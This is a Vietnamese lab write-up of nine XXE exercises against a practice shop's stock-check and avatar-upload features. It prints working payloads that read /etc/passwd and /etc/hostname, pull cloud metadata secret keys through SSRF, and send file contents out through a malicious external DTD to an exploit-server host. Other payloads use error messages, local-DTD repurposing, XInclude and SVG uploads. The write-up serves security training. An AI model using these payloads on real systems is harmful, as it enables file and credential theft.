# **1. Lab: Exploiting XXE using external entities to retrieve files**
>Mô tả cho biết chức năng "Check stock" trong lab sử dụng XML để phân tích dữ liệu đầu vào, và nó có thể trả về dữ liệu ngoài mong muốn trong respone. Hoàn thành bài lab bằng cách lợi dụng lỗ hổng này và lấy được nội dung trong file `/etc/passwd`: 
>![image](https://hackmd.io/_uploads/SkmYSOgGC.png)

>Truy cập lab và thấy có chức năng Check stock để kiểm tra số hàng trong kho: ![image](https://hackmd.io/_uploads/HyW4RtxGC.png)

>Bắt request `POST /product/stock` và thấy rằng phần body được viết bằng XML: ![image](https://hackmd.io/_uploads/ByMoAYeM0.png)

>Nghi ngờ tại chỗ này có khả năng bị lỗ hổng XXE, cho request sang Repeater, thử thêm 1 số giá trị lạ làm sai cú pháp vào trong body xem XML Parse có đang thực hiện việc xử lí không: ![image](https://hackmd.io/_uploads/BJLbJqeGA.png)

>Xác nhận được rằng XML Parse đang hoạt động, tức là nó đang xử lí input ta đưa vào! Có thể chắc chắn hơn bằng cách đưa request vào trong chức năng Scan tự động của BurpSuite: ![image](https://hackmd.io/_uploads/Bk00kcgGC.png)

>Ta sẽ thêm 1 DTD vào và khai báo 1 thực thể mới `test` trong XML: 
>`<!DOCTYPE foo [<!ENTITY test SYSTEM "file:///etc/passwd"> ]>`

>Khi đó, thực thể `test` sẽ lấy dữ liệu bên trong `/etc/passwd` và in nó ra màn hình:
>![image](https://hackmd.io/_uploads/ryROecgGR.png)

>Send request và server trả về thông tin nội dung bên trong `/etc/passwd`: ![image](https://hackmd.io/_uploads/Hyiax5xzR.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Byq0l9xMA.png)

# **2. Lab: Exploiting XXE to perform SSRF attacks**
>Mô tả cho biết chức năng "Check stock" trong lab sử dụng XML để phân tích dữ liệu đầu vào, và nó có thể trả về dữ liệu ngoài mong muốn trong respone. Hoàn thành bài lab bằng cách kết hợp với SSRF để đọc được key bên trong `http://169.254.169.254/`:
![image](https://hackmd.io/_uploads/r1nyz9xzR.png)

>Truy cập lab và thấy có chức năng Check stock để kiểm tra số hàng trong kho:
>![image](https://hackmd.io/_uploads/r1wcz9lGR.png)

>Bắt request `POST /product/stock` và thấy rằng phần body được viết bằng XML:
>![image](https://hackmd.io/_uploads/By8pGclfC.png)

>Nghi ngờ tại chỗ này có khả năng bị lỗ hổng XXE, cho request sang Repeater, thử thêm 1 số giá trị lạ làm sai cú pháp vào trong body xem XML Parse có đang thực hiện việc xử lí không:
>![image](https://hackmd.io/_uploads/S1sgXqgM0.png)

>Xác nhận được rằng XML Parse đang hoạt động, tức là nó đang xử lí input ta đưa vào! 

>Ta sẽ thêm 1 DTD vào và khai báo 1 thực thể mới `test` trong XML: 
>`<!DOCTYPE foo [<!ENTITY test SYSTEM "http://169.254.169.254"> ]>`
>![image](https://hackmd.io/_uploads/HJA_X9lMA.png)

>Khi đó, thực thể `test` sẽ lấy dữ liệu bên trong đường dẫn `http://169.254.169.254` và in nó ra màn hình:
>![image](https://hackmd.io/_uploads/Hyso7cxG0.png)

>Thông báo lỗi **"Invalid product ID: latest"**, => `latest` chính là đường dẫn chứa EC2 metadata.
>Sử dụng payload sau và tiếp tục lấy được địa chỉ tiếp theo: 
>`<!DOCTYPE foo [<!ENTITY test SYSTEM "http://169.254.169.254/latest"> ]>`
![image](https://hackmd.io/_uploads/Sy72HqlzA.png)

>Tiếp tục quá trình trên, cuối cùng ta sẽ thu được `SecretAccessKey`
>![image](https://hackmd.io/_uploads/H1oeIqgf0.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJrm89eG0.png)

# **3. Lab: Blind XXE with out-of-band interaction**
![image](https://hackmd.io/_uploads/Sy4Nd9xzA.png)

>Truy cập lab và thấy có chức năng Check stock để kiểm tra số hàng trong kho:
![image](https://hackmd.io/_uploads/SJTYjcgMC.png)

>Bắt request `POST /product/stock` và thấy rằng phần body được viết bằng XML:
![image](https://hackmd.io/_uploads/S1ZsjcxGR.png)

>Nghi ngờ tại chỗ này có khả năng bị lỗ hổng XXE, cho request sang Repeater, thử thêm 1 số giá trị lạ làm sai cú pháp vào trong body xem XML Parse có đang thực hiện việc xử lí không: 
>![image](https://hackmd.io/_uploads/SJDps5xf0.png)

>Thử thêm thực thể đã được định nghĩa sẵn, như `&lt;` (dấu <): ![image](https://hackmd.io/_uploads/SyfX3clM0.png)

>Nhưng server không trả về bất cứ gì!

>Tiếp tục thử thêm 1 DTD mới: ![image](https://hackmd.io/_uploads/SJCuhclfR.png)

>Kết quả server vẫn không trả về thêm 1 thông tin gì để khai thác, nhưng nó vẫn xử lí lỗi sai cú pháp! => có thể dính Blind XXE !!

>Ta có thể dùng tương tác ngoài băng tần Out-of-band để khai thác, sử dụng Burp Collaborator, và trỏ tới domain của ta: 
>`<!DOCTYPE foo [<!ENTITY test SYSTEM "http://vtsghed42amqo562v3k9pletnktbh15q.oastify.com"> ]>`
>![image](https://hackmd.io/_uploads/r12x65ezA.png)

>Lúc này bên phía Collab nhận được các request gửi tới: ![image](https://hackmd.io/_uploads/rkXNpqlGA.png)

>Từ đó, ta có thể biết được rằng bên server sử dụng Java/21.0.1... Hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/SyTD6qgMC.png)

# **4. Lab: Blind XXE with out-of-band interaction via XML parameter entities**
>Mô tả cho biết chức năng "Check stock" trong lab sử dụng XML để phân tích dữ liệu đầu vào, nhưng nó không hiển thị kết quả ngoài mong muốn lên màn hình, và đặc biệt còn chặn các request chứa các thực thể bên ngoài thường dùng.
![image](https://hackmd.io/_uploads/S14py6xGA.png)

>Truy cập lab và thấy có chức năng Check stock để kiểm tra số hàng trong kho:
![image](https://hackmd.io/_uploads/SJM5x6gM0.png)

>Bắt request `POST /product/stock` và thấy rằng phần body được viết bằng XML:
![image](https://hackmd.io/_uploads/B1fnlplGR.png)

>Nghi ngờ tại chỗ này có khả năng bị lỗ hổng XXE, cho request sang Repeater, thử thêm 1 số giá trị lạ làm sai cú pháp vào trong body xem XML Parse có đang thực hiện việc xử lí không: 
![image](https://hackmd.io/_uploads/S1rRlTxfR.png)

>Thử thêm thực thể đã được định nghĩa sẵn, như `&lt;` (dấu <): 
>![image](https://hackmd.io/_uploads/SJGlZpeMC.png)

>Thấy rằng server đã chặn request chứa các thực thể bên ngoài thông thường! Để bypass, ta sẽ sử dụng **XML parameter entity**. Đây là một dạng **entity đặc biệt** của XML sử dụng kí tự **%** thay **&**. Đồng thời những parameter entity chỉ được sử dụng trong DTD nó được định nghĩa. Ta sẽ sử dụng payload sau:
`<!DOCTYPE foo [ <!ENTITY % test SYSTEM "http://<COLLABORATOR_DOMAIN>"> %test; ]>`
![image](https://hackmd.io/_uploads/BkSp-agGA.png)

>Kết quả xuất hiện DNS và HTTP request gửi đến collaborator. Như vậy ta đã bypass được server bằng parameter entity: ![image](https://hackmd.io/_uploads/HydZG6ezC.png)

> Và hoàn thành được bài lab: ![image](https://hackmd.io/_uploads/B1m7MpefR.png)

# **5. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD**
![image](https://hackmd.io/_uploads/r19QykZGC.png)

>Mục tiêu bài lab này là trích xuất được thông tin của server thông qua Blind XXE. Cách triển khai gồm các bước như sau:
**Bước 1:** Attacker host 1 file DTD tại đường dẫn **http://<EXPLOIT-SERVER>/exploit** có nội dung sau:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % exp "<!ENTITY &#x25; attack SYSTEM 'https://exploit-0ab100e304fa2eee8181929e0156005a.exploit-server.net/flag?name=%file;'>">
%exp;
%attack;
```
>Trong đó: 
> * `%file;` chứa nội dung cần lấy, ở đây là file `/etc/hostname`.
> * `%exp;` định nghĩa 1 paramter entity `%attack;` có chức năng query đến domain attacker đang host kèm theo nội dung của` %file;` thông qua tham số `name`.
    
> => Khi đó, nếu server truy cập đường dẫn chứa file DTD này, attacker sẽ lấy được nội dung cần lấy:
    ![image](https://hackmd.io/_uploads/B1UTg1-f0.png)

> **Bước 2:** Để làm được điều đó, ta sử dụng payload sau tại chức năng **Check stock** như các bài trên:
    ![image](https://hackmd.io/_uploads/rJNAWyWfA.png)

> **Bước 3:**  Kiểm tra log của exploit server có thấy request chứa nội dung file `/etc/hostname` tại tham số `name`:
    ![image](https://hackmd.io/_uploads/H1Dmfy-G0.png)

> Submit flag và hoàn thành bài lab: 
![image](https://hackmd.io/_uploads/r1iUf1ZGR.png)
![image](https://hackmd.io/_uploads/S1BvMJZzA.png)

# **6. Lab: Exploiting blind XXE to retrieve data via error messages**
>Mô tả cho biết chức năng "Check stock" trong lab sử dụng XML để phân tích dữ liệu đầu vào, nhưng sẽ không hiển thị kết quả. Để giải quyết bài lab, hãy sử dụng external DTD để kích hoạt thông báo lỗi, hiển thị nội dung của tệp `/etc/passwd`. Lab liên kết đến máy chủ khai thác trên một miền khác nơi ta có thể lưu trữ DTD độc hại của mình.
![image](https://hackmd.io/_uploads/BJnDszmzC.png)

>Tiếp tục là 1 bài Blind XXE, ta sẽ thử dùng cách của bài trên để lấy nội dung của `/etc/hostname` và nó vẫn hoạt động tốt: ![image](https://hackmd.io/_uploads/B1Uzg7XMC.png)

>Nhưng khi truy xuất nội dung của `/etc/passwd` lại không được: ![image](https://hackmd.io/_uploads/SJ0ulQmfR.png)
![image](https://hackmd.io/_uploads/BJ-slmQGC.png)

>Không có 1 kết quả nào trả về: ![image](https://hackmd.io/_uploads/BJQ1bQmGC.png)

>Nhưng bài này thú vị ở chỗ, nó sẽ thông báo ra toàn bộ lỗi khi thực thi: ![image](https://hackmd.io/_uploads/Sy-qmX7M0.png)

> Ta có thể lợi dụng lỗi thông báo này để lấy ra được nội dung `/etc/passwd` ! Ta có thể lưu trữ 1 DTD độc hại trong máy chủ exploit, với payload sau: 
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exp "<!ENTITY &#x25; attack SYSTEM 'file:///test.php/%file;'>">
%exp;
%attack;
```
>Trong đó: 
> * `%file;` chứa nội dung cần lấy, ở đây là file `/etc/passwd`.
> * `%exp;` định nghĩa 1 paramter entity `%attack;` có chức năng query đến file không tồn tại `test.php` kèm theo nội dung của` %file;`. Nhưng do trong server không tồn tại file `test.php` nên sẽ trả về lỗi, có chứa nội dung `/etc/passwd`: ![image](https://hackmd.io/_uploads/Hk-pNX7GC.png)

>Tạo một parameter external entity và sử dụng nó tại body Check stock request khiến server truy cập đến đường dẫn `http://<EXPLOIT-SERVER>/exploit`. Kết quả server trả lỗi kèm theo nội dung file `/etc/passwd`: ![image](https://hackmd.io/_uploads/BJ5FHXXz0.png)

>Và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HkJoHm7MR.png)

# **7. Lab: Exploiting XXE to retrieve data by repurposing a local DTD**
>Mô tả cho biết chức năng **"Check stock"** trong lab sử dụng XML để phân tích dữ liệu đầu vào, nhưng sẽ không hiển thị kết quả. Để giải quyết bài lab, hãy sử dụng external DTD để kích hoạt thông báo lỗi, hiển thị nội dung của tệp `/etc/passwd`. Ta sẽ cần 1 file DTD tồn tại sẵn trong server và định nghĩa lại nó, biết file DTD nằm ở `/usr/share/yelp/dtd/docbookx.dtd` chứa 1 entity là `ISOamso`:
![image](https://hackmd.io/_uploads/Hkw9OQQzC.png)

>Các hệ thống Linux sử dụng môi trường Gnome desktop thường có tệp DTD tại `/usr/share/yelp/dtd/docbookx.dtd`. Ta có thể kiểm tra xem tệp này có tồn tại hay không bằng cách gửi payload XXE sau:
```
<!DOCTYPE foo \[ <!ENTITY % local\_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local\_dtd; \]>
```
>Nếu tệp tồn tại thì kết quả trả về số lượng sản phẩm trong kho như bình thường, ngược lại nếu không tồn tại sẽ thông báo lỗi: 
![image](https://hackmd.io/_uploads/BymVjQ7GR.png)

>Ở dạng bài này, mục tiêu là ta sẽ import một local DTD có sẵn của hệ thống và định nghĩa là một entity có chứa trong DTD đó. Ở đây, Hint chỉ ra rằng hệ thống có 1 DTD tại `/usr/share/yelp/dtd/docbookx.dtd` có chứa 1 entity tên `ISOamso`. Tạo payload sau:

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
> Trong đó:
>- `%local_dtd;` sẽ import file `/usr/share/yelp/dtd/docbookx.dtd` 
>- `%ISOamso` được định nghĩa lại nhằm lấy được nội dung file `/etc/passwd` thông qua `%file;` nhờ lỗi trả về khi external entity `%error;` tham chiếu đến `file://%file;` không tồn tại trong hệ thống.

> Lúc này, khi injection payload trên và gửi request đi, server trả về lỗi **FileNotFound** và có chứa nội dung file `/etc/passwd` cần lấy: ![image](https://hackmd.io/_uploads/Syr82m7fR.png)

>Như vậy, ta đã hoàn thành bài lab: 
![image](https://hackmd.io/_uploads/S1ZO277zR.png)

# **8. Lab: Exploiting XInclude to retrieve files**
>Lab này có tính năng **"Check sotck"** nhúng thông tin đầu vào của người dùng vào bên trong tài liệu XML phía máy chủ và sau đó được phân tích cú pháp. Bởi vì input không gửi XML nên ta không thể định nghĩa DTD để khai thác XXE thông thường.
Để giải quyết bài lab, hãy thêm một câu lệnh XInclude để truy xuất nội dung của tệp `/etc/passwd`
![image](https://hackmd.io/_uploads/rJNwlNQf0.png)

>Trong bài này thì phần body của request sẽ không chứa định dạng XML nữa, thay vào đó là cặp tham số `productID` và `storeID`: ![image](https://hackmd.io/_uploads/HJihv4XzR.png)

>Như vậy, ta không thể thực hiện cách tấn công thông thường như các bài trước nữa vì không thể control toàn bộ XML được xử lí. XInclude là một phần của ngôn ngữ XML được sử dụng để chia sẻ và tái sử dụng dữ liệu trong các tài liệu XML.
Nó cho phép ta chèn (include) nội dung của một tài liệu XML vào một tài liệu khác. Do đó, ta sẽ sử dụng **XInclude** vào bất kì trường nào để include payload vào!! 
    
> Để tấn công thành công, ta cần reference XInclude namespace và đường dẫn file cần đọc, ở đây là `/etc/passwd`.
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

> Chèn payload trên vào trường `productId`, ta thấy kết quả trả về nội dung file `/etc/passwd` thành công: 
> ![image](https://hackmd.io/_uploads/HyxidV7M0.png)

> Như vậy là ta đã hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJUnO4QfC.png)

# **9. Lab: Exploiting XXE via image file upload**
> Lab này cho phép người dùng đính kèm hình đại diện vào nhận xét và sử dụng thư viện Apache Batik để xử lý tệp hình ảnh đại diện. Để giải bài lab, tải lên hình ảnh để làm hiển thị nội dung của tệp `/etc/hostname` sau khi được server xử lý. Sau đó sử dụng nút "Submit solution" để gửi flag:
![image](https://hackmd.io/_uploads/H1l2YNXMC.png)

>Bài lab có chức năng comment tại các bài post, trong đó cho phép user upload ảnh avatar. Avatar này phải là PNG, JPG, JPEG:
>![image](https://hackmd.io/_uploads/Hy6P947M0.png)

> Ta thử comment hợp lệ và bắt request: ![image](https://hackmd.io/_uploads/H19njEmMC.png)

>Vì một số thư viện xử lí ảnh `PNG`, `JPG`, ... có hỗ trợ xử lí file `SVG` nên ta có thể upload một file `.svg` có chứa XML payload trong đó:
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="160px" height="160px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
>![image](https://hackmd.io/_uploads/Skkj24QGA.png)

>File SVG trên sẽ generate ra 1 ảnh có kích thước 160x160 có chứa đoạn text chính là nội dung file `/etc/hostname` cần lấy! Lúc này, quay lại bài post và thấy avatar user sẽ là các ảnh vừa generate ra: ![image](https://hackmd.io/_uploads/Hk7bTVQzR.png)

>Phóng to ảnh ra và lấy được flag là hostname của server!! Tiến hành nộp flag và ta sẽ hoàn thành bài lab: 
> ![image](https://hackmd.io/_uploads/BJwOT47zC.png)
